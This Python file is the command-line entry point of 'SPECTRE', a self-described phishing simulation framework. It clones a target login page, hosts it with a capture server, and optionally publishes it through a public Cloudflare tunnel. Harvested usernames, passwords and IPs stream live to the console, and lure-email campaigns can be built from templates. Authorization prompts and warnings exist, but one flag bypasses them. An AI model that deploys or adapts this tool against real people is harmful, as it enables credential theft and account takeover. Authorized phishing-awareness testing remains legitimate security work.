# ============================================================
#  File: spectre/__main__.py
#  SPECTRE — auto mode by default. Cloudflare with QUIC/HTTP2
#  fallback, URL verification, and OS-aware install command.
# ============================================================
import argparse
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime
from urllib.parse import urlsplit

from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from rich.text import Text

from . import __version__, banner, theme as T
from .core.logger import Logger
from .core.http import HttpClient
from .core.errors import SpectreError, SafetyError, CloneError
from .core import ui, safety
from .clone import LoginCloner
from .serve import CaptureServer


DATA_DIR = os.path.expanduser("~/spectre_data")
KNOWN_SUBCMDS = {"clone", "serve", "campaign", "dashboard",
                 "report", "purge", "setup"}


# ================================================================
#  Parsers
# ================================================================
def _auto_parser():
    p = argparse.ArgumentParser(
        prog="spectre",
        description="SPECTRE - phishing simulation framework // DEDSEC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
    spectre https://target.com/login
        clone, host locally, live-tail captures

    spectre https://target.com/login --cloudflare
        same, plus a public Cloudflare tunnel URL

    spectre https://target.com/login --gui
        same, plus the PyQt dashboard window

    spectre https://target.com/login --host 0.0.0.0 --port 8080
        expose on your local network for a phone/tablet test

    spectre setup
        install cloudflared for your OS
""")
    p.add_argument("target", help="login URL to clone & host")
    p.add_argument("-o", "--output", help="clone output directory")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--redirect", default="https://example.com")
    p.add_argument("--banner", action="store_true",
                   help="inject simulation warning banner on clone")
    p.add_argument("--gui", action="store_true",
                   help="open the GUI dashboard too")
    p.add_argument("--cloudflare", action="store_true",
                   help="start a public Cloudflare quick tunnel")
    p.add_argument("--keep", action="store_true",
                   help="keep cloned page files after exit")
    p.add_argument("--i-have-authorization", action="store_true")
    p.add_argument("--version", action="version",
                   version=f"SPECTRE {__version__} (DEDSEC)")
    return p


def _subcommand_parser():
    p = argparse.ArgumentParser(
        prog="spectre",
        description="SPECTRE - phishing simulation framework // DEDSEC")
    sub = p.add_subparsers(dest="cmd", required=True)

    c = sub.add_parser("clone", help="clone a login page")
    c.add_argument("url")
    c.add_argument("-o", "--output", required=True)
    c.add_argument("--banner", action="store_true")
    c.add_argument("--i-have-authorization", action="store_true")

    s = sub.add_parser("serve", help="serve a cloned page locally")
    s.add_argument("clone_dir")
    s.add_argument("--host", default="127.0.0.1")
    s.add_argument("--port", type=int, default=8080)
    s.add_argument("--redirect", default="https://example.com")
    s.add_argument("--campaign-id", default="default")

    camp = sub.add_parser("campaign", help="manage campaigns")
    camp_sub = camp.add_subparsers(dest="camp_cmd", required=True)

    cn = camp_sub.add_parser("new")
    cn.add_argument("--name", required=True)
    cn.add_argument("--clone", required=True)
    cn.add_argument("--clone-target", default="")
    cn.add_argument("--allow", required=True)
    cn.add_argument("--from", dest="from_email", required=True)
    cn.add_argument("--sender-name", default="IT Support")
    cn.add_argument("--subject", required=True)
    cn.add_argument("--template", default="it")
    cn.add_argument("--host", default="127.0.0.1")
    cn.add_argument("--port", type=int, default=8080)
    cn.add_argument("--redirect", default="https://example.com")
    cn.add_argument("--allow-consumer-domains", action="store_true")
    cn.add_argument("--i-have-authorization", action="store_true")

    camp_sub.add_parser("list")

    cs = camp_sub.add_parser("show")
    cs.add_argument("campaign_id")

    d = sub.add_parser("dashboard")
    d.add_argument("campaign_id")

    r = sub.add_parser("report")
    r.add_argument("campaign_id")

    pu = sub.add_parser("purge")
    pu.add_argument("campaign_id")
    pu.add_argument("--i-understand", action="store_true")

    st = sub.add_parser("setup",
                        help="install cloudflared for your OS")
    st.add_argument("--dry-run", action="store_true",
                    help="print commands, don't run them")

    p.add_argument("--version", action="version",
                   version=f"SPECTRE {__version__} (DEDSEC)")
    return p


def parse_args(argv=None):
    if argv is None:
        argv = sys.argv[1:]
    first = None
    for a in argv:
        if a.startswith("-"):
            continue
        first = a
        break
    if first in KNOWN_SUBCMDS:
        return _subcommand_parser().parse_args(argv), "sub"
    return _auto_parser().parse_args(argv), "auto"


# ================================================================
#  Authorization prompt
# ================================================================
def _authorized(skip, console):
    if skip:
        return True
    banner.print_disclaimer(console)
    return Confirm.ask(
        f"[{T.HEX['amber']}]Do you have written authorization from "
        f"everyone you intend to test?[/]", default=False)


# ================================================================
#  Cloudflare — resolve binary
# ================================================================
def _resolve_cloudflared(logger):
    """
    Priority:
      1. system PATH
      2. ~/.local/share/spectre/cloudflared (our cache)
      3. flaredantic one-time download into our cache
    """
    # 1. system
    found = shutil.which("cloudflared")
    if found:
        logger.info(f"using system cloudflared: {found}")
        return found

    # 2. our own cache
    cache_dir = os.path.expanduser("~/.local/share/spectre")
    os.makedirs(cache_dir, exist_ok=True)
    cached = os.path.join(cache_dir, "cloudflared")
    if os.path.isfile(cached) and os.access(cached, os.X_OK):
        logger.info(f"using cached cloudflared: {cached}")
        return cached

    # 3. flaredantic one-time download
    try:
        from flaredantic import FlareConfig, FlareTunnel  # noqa
        logger.info("no system cloudflared — "
                    "warming flaredantic cache …")
        try:
            from flaredantic.utils import download_cloudflared
            path = download_cloudflared()
            if path and os.path.isfile(path):
                shutil.copy2(path, cached)
                os.chmod(cached, 0o755)
                logger.ok(f"cached cloudflared -> {cached}")
                return cached
        except Exception:
            pass
        try:
            from flaredantic import ensure_cloudflared_installed
            path = ensure_cloudflared_installed()
            if path and os.path.isfile(path):
                shutil.copy2(path, cached)
                os.chmod(cached, 0o755)
                return cached
        except Exception:
            pass
    except ImportError:
        pass
    except Exception as e:
        logger.warn(f"flaredantic unavailable: {e}")

    return None


# ================================================================
#  Cloudflare — warning + spawn + verify
# ================================================================
def _print_cloudflare_warning(console):
    body = Text.from_markup(
        f"[bold {T.HEX['red']}]CLOUDFLARE TUNNEL — PUBLIC URL[/]\n\n"
        f"[{T.HEX['text']}]You are about to expose your local server "
        f"to the [b]public internet[/b] through a Cloudflare quick "
        f"tunnel.[/]\n\n"
        f"[{T.HEX['amber']}]This means:[/]\n"
        f"  - Anyone with the URL can reach your cloned login page\n"
        f"  - Credentials submitted by an unintended visitor are "
        f"captured\n"
        f"  - The URL lives at *.trycloudflare.com and ends when this "
        f"process stops\n"
        f"  - Cloudflare may rate-limit or block based on their "
        f"abuse detection\n\n"
        f"[{T.HEX['green_hi']}]This is only safe when:[/]\n"
        f"  - You send the URL ONLY to authorized test recipients\n"
        f"  - You stop the tunnel immediately after the test\n"
        f"  - You have written authorization from every recipient\n\n"
        f"[bold {T.HEX['white']}]The moment a public URL exists, YOU "
        f"are responsible for who uses it.[/]"
    )
    console.print(Panel(
        body,
        title=f"[bold {T.HEX['red']}]PUBLIC EXPOSURE WARNING[/]",
        border_style=T.HEX["red"],
        padding=(1, 2),
    ))
    console.print()


def start_cloudflare_tunnel(local_port, logger):
    """
    Try QUIC first, fall back to HTTP/2.  For each protocol:
      - spawn cloudflared
      - wait for URL *and* 'Registered tunnel connection'
      - verify the URL is reachable from the edge
    Returns (tunnel_handle, public_url) or (None, "").
    """
    cf_bin = _resolve_cloudflared(logger)
    if not cf_bin:
        logger.err("no cloudflared available — run 'spectre setup'")
        return None, ""

    for proto in ("quic", "http2"):
        logger.step(f"starting cloudflare tunnel ({proto}) -> "
                    f"http://127.0.0.1:{local_port}")
        tunnel, url = _spawn_and_wait(
            cf_bin, local_port, proto, logger)

        if not (tunnel and url):
            logger.warn(f"tunnel {proto} failed to start")
            continue

        logger.info("verifying tunnel is reachable from the edge …")
        if _verify_tunnel_url(url, timeout=30):
            logger.ok(f"public URL: {url}")
            return tunnel, url

        logger.warn(f"tunnel {proto} registered but URL did not "
                    f"respond within 30s — trying next protocol")
        try:
            tunnel.stop()
        except Exception:
            pass

    logger.err("cloudflare tunnel could not be established "
               "(all protocols tried)")
    logger.info("check your internet connection and try again")
    return None, ""


def _spawn_and_wait(cf_bin, local_port, protocol, logger,
                    startup_timeout=60):
    """Spawn cloudflared; wait for URL + registration."""
    cmd = [
        cf_bin, "tunnel",
        "--url", f"http://127.0.0.1:{local_port}",
        "--no-autoupdate",
        "--protocol", protocol,
        "--edge-ip-version", "4",
    ]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
    except Exception as e:
        logger.err(f"failed to spawn cloudflared: {e}")
        return None, ""

    url_re = re.compile(r"(https://[a-z0-9\-]+\.trycloudflare\.com)")
    state = {"url": "", "registered": False, "done": False}

    def reader():
        try:
            for line in proc.stdout:
                if state["done"]:
                    break
                m = url_re.search(line)
                if m and not state["url"]:
                    state["url"] = m.group(1)
                low = line.lower()
                if ("registered tunnel connection" in low
                        or "registered tunnel" in low
                        or "connection registered" in low):
                    state["registered"] = True
                if state["url"] and state["registered"]:
                    state["done"] = True
                    break
        except Exception:
            pass

    threading.Thread(target=reader, daemon=True).start()

    deadline = time.time() + startup_timeout
    while time.time() < deadline:
        if state["url"] and state["registered"]:
            break
        time.sleep(0.5)

    if not state["url"]:
        logger.err(f"cloudflared did not print a URL within "
                   f"{startup_timeout}s ({protocol})")
        try:
            proc.terminate()
        except Exception:
            pass
        return None, ""

    if not state["registered"]:
        logger.warn(f"cloudflared printed URL but never logged "
                    f"'Registered tunnel connection' ({protocol})")

    class _ProcTunnel:
        def __init__(self, p):
            self._p = p

        def stop(self):
            try:
                self._p.terminate()
                self._p.wait(timeout=5)
            except Exception:
                try:
                    self._p.kill()
                except Exception:
                    pass

    time.sleep(2.0)   # grace period after registration
    return _ProcTunnel(proc), state["url"]


def _verify_tunnel_url(url, timeout=30):
    """Poll URL until Cloudflare returns a non-5xx response."""
    deadline = time.time() + timeout
    last_err = ""

    while time.time() < deadline:
        try:
            req = urllib.request.Request(
                url, method="GET",
                headers={"User-Agent":
                         "Mozilla/5.0 (compatible; spectre/1.0)"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                if resp.status < 500:
                    return True
                last_err = f"status {resp.status}"
        except urllib.error.HTTPError as e:
            if e.code < 500:
                return True
            last_err = f"HTTP {e.code}"
        except Exception as e:
            last_err = str(e)[:80]
        time.sleep(1.5)

    if last_err:
        sys.stderr.write(f"[spectre] tunnel verify failed: "
                         f"{last_err}\n")
    return False


# ================================================================
#  AUTO MODE
# ================================================================
def run_auto(args, console):
    logger = Logger(verbose=True, console=console)

    target = args.target
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    if not _authorized(args.i_have_authorization, console):
        console.print(f"[{T.HEX['red']}]Aborted.[/]")
        return 1

    # ---- output directory ----
    if args.output:
        out_dir = os.path.abspath(args.output)
    else:
        slug = urlsplit(target).netloc.replace(":", "_")
        out_dir = os.path.join(DATA_DIR, "pages", slug)
    os.makedirs(out_dir, exist_ok=True)

    # ---- 1. clone ----
    ui.section(console, "1 - cloning target")
    http = HttpClient()
    cloner = LoginCloner(http, logger, target, out_dir=out_dir,
                         inject_banner=args.banner)
    try:
        result = cloner.clone()
    except CloneError as e:
        logger.err(str(e))
        return 2

    # ---- 2. local server ----
    ui.section(console, "2 - starting local server")
    campaign_id = datetime.now().strftime("%Y%m%d-%H%M%S")
    server = CaptureServer(
        logger=logger,
        clone_dir=result["out_dir"],
        data_dir=DATA_DIR,
        host=args.host,
        port=args.port,
        redirect_after=args.redirect,
        campaign_id=campaign_id)
    server.start(blocking=False)

    local_url = f"http://{args.host}:{args.port}/"

    # ---- 3. cloudflare tunnel ----
    cf_tunnel = None
    cf_url = ""
    if args.cloudflare:
        _print_cloudflare_warning(console)
        if Confirm.ask(
                f"[bold {T.HEX['red']}]Confirm public exposure?[/]",
                default=False):
            cf_tunnel, cf_url = start_cloudflare_tunnel(
                args.port, logger)
            if not cf_url:
                logger.warn("cloudflare tunnel unavailable — "
                            "local mode only")
        else:
            logger.info("cloudflare tunnel skipped")

    # ---- 4. optional GUI ----
    if args.gui:
        from .track import run_dashboard
        threading.Thread(
            target=lambda: run_dashboard(campaign_id, DATA_DIR),
            daemon=True).start()

    # ---- 5. summary box ----
    console.print()
    if cf_url:
        body = (
            f"[bold {T.HEX['red']}]PUBLIC URL[/]\n"
            f"      {cf_url}\n\n"
            f"[{T.HEX['text_dim']}]local    :[/] {local_url}\n"
            f"[{T.HEX['text_dim']}]cloned   :[/] {result['target']}\n"
            f"[{T.HEX['text_dim']}]assets   :[/] {result['assets']}\n"
            f"[{T.HEX['text_dim']}]forms    :[/] {result['forms']}\n"
            f"[{T.HEX['text_dim']}]campaign :[/] {campaign_id}\n"
            f"[{T.HEX['text_dim']}]captures :[/] {server.captures_file}"
        )
        ui.highlight(console, "LIVE - PUBLIC", body,
                     style=T.HEX["red"])
    else:
        body = (
            f"open this URL:\n"
            f"      [bold]{local_url}[/bold]\n\n"
            f"[{T.HEX['text_dim']}]cloned   :[/] {result['target']}\n"
            f"[{T.HEX['text_dim']}]assets   :[/] {result['assets']}\n"
            f"[{T.HEX['text_dim']}]forms    :[/] {result['forms']}\n"
            f"[{T.HEX['text_dim']}]campaign :[/] {campaign_id}\n"
            f"[{T.HEX['text_dim']}]captures :[/] {server.captures_file}"
        )
        ui.highlight(console, "LIVE", body, style=T.HEX["purple"])

    # ---- 6. live tail ----
    ui.section(console, "3 - live captures (Ctrl+C to stop)")
    seen = 0
    try:
        while True:
            time.sleep(0.6)
            caps = server.get_captures()
            while seen < len(caps):
                rec = caps[seen]
                seen += 1
                ts = (rec.get("ts", "") or "")[-9:-1]
                console.print(
                    f"[{T.HEX['text_dim']}]{ts}[/]  "
                    f"[bold {T.HEX['green_hi']}]CAPTURE[/]  "
                    f"[{T.HEX['purple_hi']}]"
                    f"{rec.get('username','')}[/]  "
                    f"[bold {T.HEX['white']}]"
                    f"{rec.get('password','')}[/]  "
                    f"[{T.HEX['text_dim']}]"
                    f"{rec.get('ip','')}[/]")
    except KeyboardInterrupt:
        console.print()
        logger.info("shutting down")

    # ---- 7. teardown ----
    if cf_tunnel is not None:
        try:
            cf_tunnel.stop()
        except Exception:
            pass
        logger.info("cloudflare tunnel stopped")

    # ---- 8. report ----
    try:
        from .report import export_json, export_markdown
        out_rep = os.path.join(DATA_DIR, "reports")
        os.makedirs(out_rep, exist_ok=True)
        captures = server.get_captures()
        camp_dict = {
            "id": campaign_id,
            "name": urlsplit(target).netloc or target,
            "created_at":
                datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "authorization_confirmed_at":
                datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "clone_target": target,
            "clone_dir": result["out_dir"],
            "serve_host": args.host,
            "serve_port": args.port,
            "redirect_after": args.redirect,
            "email_from": "", "email_subject": "",
            "recipients": [], "status": "stopped",
            "cloudflare_url": cf_url,
        }
        md = export_markdown(
            camp_dict, captures,
            os.path.join(out_rep, f"report-{campaign_id}.md"))
        js = export_json(
            {"campaign": camp_dict, "captures": captures},
            os.path.join(out_rep, f"report-{campaign_id}.json"))
        logger.ok(f"report -> {md}")
        logger.ok(f"report -> {js}")
    except Exception as e:
        logger.warn(f"report save failed: {e}")

    if not args.keep:
        logger.info(f"cloned page retained at {result['out_dir']}")
    return 0


# ================================================================
#  SUBCOMMANDS
# ================================================================
def cmd_clone(args, console):
    logger = Logger(console=console)
    if not _authorized(args.i_have_authorization, console):
        return 1
    http = HttpClient()
    cloner = LoginCloner(http, logger, args.url,
                         out_dir=os.path.abspath(args.output),
                         inject_banner=args.banner)
    r = cloner.clone()
    ui.highlight(console, "CLONE COMPLETE",
                 f"target : {r['target']}\n"
                 f"output : {r['out_dir']}\n"
                 f"assets : {r['assets']}\n"
                 f"forms  : {r['forms']}",
                 style=T.HEX["purple"])
    return 0


def cmd_serve(args, console):
    logger = Logger(console=console)
    server = CaptureServer(
        logger=logger,
        clone_dir=os.path.abspath(args.clone_dir),
        data_dir=DATA_DIR,
        host=args.host, port=args.port,
        redirect_after=args.redirect,
        campaign_id=args.campaign_id)
    server.start(blocking=False)
    ui.highlight(console, "SERVER RUNNING",
                 f"listening : http://{args.host}:{args.port}/\n"
                 f"captures  : {server.captures_file}\n"
                 f"Ctrl+C to stop.",
                 style=T.HEX["green_hi"])
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("stopping")
        return 0


def cmd_campaign(args, console):
    from .campaign import CampaignManager
    from .send import templates as email_templates
    logger = Logger(console=console)

    if args.camp_cmd == "list":
        mgr = CampaignManager(logger, DATA_DIR)
        ui.section(console, "Campaigns")
        ui.campaigns_table(console, mgr.list())
        return 0

    if args.camp_cmd == "show":
        mgr = CampaignManager(logger, DATA_DIR)
        c = mgr.load(args.campaign_id)
        ui.section(console, f"Campaign {c.id}")
        ui.kv_table(console, [
            ("name", c.name),
            ("created", c.created_at),
            ("authorized", c.authorization_confirmed_at),
            ("clone target", c.clone_target),
            ("recipients", len(c.recipients)),
            ("status", c.status),
        ])
        return 0

    if args.camp_cmd == "new":
        if not _authorized(args.i_have_authorization, console):
            return 1
        allowlist = safety.load_allowlist(args.allow)
        recipients = sorted(allowlist)
        safety.validate_targets(
            recipients, allowlist,
            allow_consumer=args.allow_consumer_domains)
        body = email_templates.render(
            args.template, "%url%", sender=args.sender_name)
        mgr = CampaignManager(logger, DATA_DIR)
        c = mgr.create(
            name=args.name, clone_target=args.clone_target,
            clone_dir=os.path.abspath(args.clone),
            recipients=recipients, email_from=args.from_email,
            email_subject=args.subject, email_body=body,
            serve_host=args.host, serve_port=args.port,
            redirect_after=args.redirect,
            authorized=args.i_have_authorization)
        ui.highlight(console, "CAMPAIGN CREATED",
                     f"id      : {c.id}\n"
                     f"targets : {len(recipients)}\n"
                     f"from    : {c.email_from}\n"
                     f"subject : {c.email_subject}",
                     style=T.HEX["purple_hi"])
        return 0
    return 0


def cmd_dashboard(args, console):
    from .track import run_dashboard
    return run_dashboard(args.campaign_id, DATA_DIR)


def cmd_report(args, console):
    from .campaign import CampaignManager
    from .report import export_json, export_markdown
    logger = Logger(console=console)
    mgr = CampaignManager(logger, DATA_DIR)
    c = mgr.load(args.campaign_id)
    captures_file = os.path.join(
        DATA_DIR, f"captures-{args.campaign_id}.jsonl")
    captures = []
    if os.path.isfile(captures_file):
        import json as _json
        with open(captures_file) as f:
            for line in f:
                try:
                    captures.append(_json.loads(line))
                except Exception:
                    pass
    out_dir = os.path.join(DATA_DIR, "reports")
    os.makedirs(out_dir, exist_ok=True)
    md = export_markdown(
        c.to_dict(), captures,
        os.path.join(out_dir, f"report-{c.id}.md"))
    js = export_json(
        {"campaign": c.to_dict(), "captures": captures},
        os.path.join(out_dir, f"report-{c.id}.json"))
    ui.section(console, "Captures")
    ui.captures_table(console, captures)
    logger.ok(f"markdown -> {md}")
    logger.ok(f"json     -> {js}")
    return 0


def cmd_purge(args, console):
    logger = Logger(console=console)
    if not args.i_understand:
        if not Confirm.ask(
                f"[{T.HEX['amber']}]Overwrite and delete campaign data?[/]",
                default=False):
            return 1
    for p in (
        os.path.join(DATA_DIR, f"captures-{args.campaign_id}.jsonl"),
        os.path.join(DATA_DIR, "campaigns", f"{args.campaign_id}.json"),
    ):
        if os.path.isfile(p):
            size = os.path.getsize(p)
            with open(p, "r+b") as f:
                f.write(os.urandom(size))
                f.flush()
                os.fsync(f.fileno())
            os.unlink(p)
            logger.ok(f"purged {p}")
    return 0


# ================================================================
#  SETUP — install cloudflared
# ================================================================
def cmd_setup(args, console):
    logger = Logger(console=console)

    if shutil.which("cloudflared"):
        logger.ok("cloudflared is already installed")
        try:
            out = subprocess.check_output(
                ["cloudflared", "--version"], text=True,
                stderr=subprocess.STDOUT).strip()
            logger.info(out)
        except Exception:
            pass
        return 0

    import platform
    sysname = platform.system().lower()
    machine = platform.machine()
    arch = "amd64" if machine in ("x86_64", "amd64") else \
           "arm64" if machine in ("aarch64", "arm64") else machine

    # Termux?
    if "com.termux" in os.environ.get("PREFIX", ""):
        logger.info("detected Termux — installing via pkg")
        cmds = [
            ["pkg", "update", "-y"],
            ["pkg", "install", "-y", "cloudflared"],
        ]
        return _run_setup_commands(cmds, args.dry_run, logger)

    distro = ""
    try:
        with open("/etc/os-release") as f:
            for line in f:
                if line.startswith("ID="):
                    distro = line.split("=", 1)[1].strip().strip('"')
                    break
    except Exception:
        pass

    logger.info(f"detected: {sysname} {distro or '?'} {arch}")

    if distro in ("arch", "manjaro", "endeavouros", "garuda"):
        cmds = [["sudo", "pacman", "-S", "--noconfirm", "cloudflared"]]
    elif distro in ("debian", "ubuntu", "kali", "pop", "linuxmint",
                    "raspbian"):
        cmds = [
            ["sudo", "mkdir", "-p", "--mode=0755",
             "/usr/share/keyrings"],
            ["bash", "-c",
             "curl -fsSL https://pkg.cloudflare.com/"
             "cloudflare-main.gpg | "
             "sudo tee /usr/share/keyrings/cloudflare-main.gpg "
             ">/dev/null"],
            ["bash", "-c",
             'echo "deb [signed-by=/usr/share/keyrings/'
             'cloudflare-main.gpg] https://pkg.cloudflare.com/'
             'cloudflared $(lsb_release -cs) main" | '
             "sudo tee /etc/apt/sources.list.d/cloudflared.list"],
            ["sudo", "apt-get", "update"],
            ["sudo", "apt-get", "install", "-y", "cloudflared"],
        ]
    elif distro in ("fedora", "rhel", "centos", "rocky", "almalinux"):
        cmds = [
            ["bash", "-c",
             "curl -fsSL https://pkg.cloudflare.com/"
             "cloudflare-repo-$(rpm -E %rhel).rpm "
             "-o /tmp/cf.rpm && sudo rpm -i /tmp/cf.rpm"],
            ["sudo", "dnf", "install", "-y", "cloudflared"],
        ]
    elif sysname == "darwin":
        cmds = [["brew", "install", "cloudflared"]]
    else:
        url = ("https://github.com/cloudflare/cloudflared/releases/"
               f"latest/download/cloudflared-linux-{arch}")
        logger.warn("unknown distro — using generic binary download")
        cmds = [
            ["bash", "-c",
             f"curl -L --retry 5 --retry-delay 2 {url} "
             f"-o /tmp/cloudflared"],
            ["sudo", "mv", "/tmp/cloudflared",
             "/usr/local/bin/cloudflared"],
            ["sudo", "chmod", "+x", "/usr/local/bin/cloudflared"],
        ]

    return _run_setup_commands(cmds, args.dry_run, logger)


def _run_setup_commands(cmds, dry_run, logger):
    for c in cmds:
        printable = " ".join(c)
        logger.info(f"$ {printable}")
        if dry_run:
            continue
        try:
            subprocess.check_call(c)
        except subprocess.CalledProcessError as e:
            logger.err(f"command failed (exit {e.returncode})")
            logger.info("retry manually or install manually — "
                        "see README")
            return 1
    logger.ok("cloudflared installed")
    try:
        out = subprocess.check_output(
            ["cloudflared", "--version"], text=True,
            stderr=subprocess.STDOUT).strip()
        logger.info(out)
    except Exception:
        pass
    return 0


# ================================================================
def main(argv=None):
    args, mode = parse_args(argv)
    console = Console()

    try:
        if mode == "auto":
            banner.print_banner(console, __version__, animate=True)
            return run_auto(args, console)

        cmd = args.cmd
        if cmd == "dashboard":
            return cmd_dashboard(args, console)
        if cmd == "purge":
            return cmd_purge(args, console)
        if cmd == "setup":
            banner.print_banner(console, __version__, animate=True)
            return cmd_setup(args, console)

        banner.print_banner(console, __version__, animate=True)
        if cmd == "clone":
            return cmd_clone(args, console)
        if cmd == "serve":
            return cmd_serve(args, console)
        if cmd == "campaign":
            return cmd_campaign(args, console)
        if cmd == "report":
            return cmd_report(args, console)
        console.print(f"[{T.HEX['red']}]unknown command[/]")
        return 1

    except SafetyError as e:
        console.print(f"[{T.HEX['red']}]safety: {e}[/]")
        return 2
    except SpectreError as e:
        console.print(f"[{T.HEX['red']}]{e}[/]")
        return 1
    except KeyboardInterrupt:
        console.print()
        return 130


if __name__ == "__main__":
    sys.exit(main())
